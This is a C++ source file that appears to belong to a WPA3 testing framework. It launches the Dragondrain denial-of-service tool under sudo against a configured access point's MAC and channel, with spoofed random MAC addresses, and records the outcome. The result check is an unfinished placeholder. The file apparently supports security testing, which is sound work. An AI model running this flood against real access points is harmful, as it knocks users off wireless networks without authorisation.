#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include <cassert>

#include "config/global_config.h"
#include "ex_program/hostapd/hostapd.h"
#include "observer/observers.h"

namespace wpa3_tester::dragondrain{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;


    auto start_dragondrain(RunStatus &rs, const string &actor_name, const string &iface, const string &target_mac,
                           const string &channel, const int bitrate, const int num_random_mac)->void{
        vector<string> command = {"sudo"};
        observer::add_nets(rs, command, actor_name);
        const string dragondrain_folder = get_global_config().at("paths").at("dragondrain").at("dragondrain_folder");
        command.insert(command.end(), {
            dragondrain_folder + "/src/dragondrain",
            "-d", iface,
            "-a", target_mac,
            "-c", channel,
            "-b", to_string(bitrate),
            "-n", to_string(num_random_mac),
            "-M", "100",
            "-r", "200"
        });
        rs.process_manager.run(actor_name, command, dragondrain_folder);
    }

    void run_attack(RunStatus& rs) {
        rs.start_observers();
        const auto& att_cfg = rs.config.at("attack_config");
        const auto attacker = rs.get_actor("attacker");

        const auto target = rs.get_actor("access_point");
        string target_mac = target["mac"];
        string channel = target["channel"];

        int bitrate = att_cfg.at("bitrate").get<int>();
        int num_random_mac = att_cfg.at("number_of_random_mac").get<int>();
            start_dragondrain(rs, attacker["actor_name"], attacker["iface"], target_mac, channel, bitrate, num_random_mac);

        ofstream attack_result(path(rs.run_folder) / "result.txt");

        //TODO change string
        attack_result << to_string(
            rs.process_manager.wait_for("attacker", "SERVER_VULNERABLE_STRING", seconds(140), false)
        );
        attack_result.close();
    }

    void stats_attack(const RunStatus &rs){

    }
}
